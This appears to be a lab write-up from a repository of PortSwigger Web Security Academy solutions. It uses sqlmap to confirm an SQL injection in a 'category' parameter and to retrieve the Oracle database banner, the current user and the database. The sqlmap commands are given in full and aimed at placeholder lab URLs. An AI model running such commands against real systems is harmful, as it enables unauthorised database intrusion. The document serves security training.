# SQLMap Verification

## Objective

Verify the SQL Injection vulnerability using SQLMap and retrieve the Oracle database version.

> **Note:** SQLMap is used only to verify the vulnerability and confirm the database version. The lab is solved manually in `README.md`.

---

# Target URL

```text
https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories
```

Replace the URL with your own PortSwigger lab URL.

---

# Step 1 - Detect SQL Injection

```bash
sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --batch
```

## Purpose

- Tests whether the `category` parameter is injectable.
- Detects the SQL Injection automatically.
- Identifies the backend database.

---

# Step 2 - Retrieve the Database Banner

```bash
sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --banner --batch
```

## Purpose

- Retrieves the Oracle database banner.
- Displays the database version.
- Confirms the backend DBMS.

Example Output

```text
banner: Oracle Database 19c Enterprise Edition Release ...
```

---

# Step 3 - View Current User (Optional)

```bash
sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --current-user --batch
```

Example Output

```text
current user: APPUSER
```

---

# Step 4 - View Current Database (Optional)

```bash
sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --current-db --batch
```

---

# Expected SQLMap Output

- SQL Injection confirmed.
- Backend DBMS identified as Oracle.
- Oracle database version displayed.
- Current user (optional).
- Current database/schema (optional).

---

# Notes

- This lab is primarily intended to be solved manually.
- SQLMap is used only to verify the vulnerability and retrieve database information.
- Avoid using database dumping options (`--dump`, `--tables`, `--columns`) unless the lab specifically requires enumeration.

---

# Related Files

- `README.md` – Manual solution
- `../../Database-Queries/Oracle.md` – Oracle SQL Injection reference
- `../../SQLMap-CheatSheet.md` – SQLMap command reference
